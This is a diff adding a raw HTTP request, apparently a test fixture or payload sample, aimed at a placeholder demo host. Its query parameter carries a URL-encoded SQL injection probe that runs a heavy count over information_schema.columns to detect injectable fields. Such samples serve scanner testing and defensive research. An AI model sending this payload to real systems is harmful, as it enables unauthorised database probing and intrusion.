@@ -1,0 +1,4 @@
+GET /a?q=1%2Band%2B1%3D%28select%2Bcount%28%2A%29%2Bfrom%2Binformation_schema.columns%29 HTTP/1.1
+Host: demo.example.com
+Connection: close
+
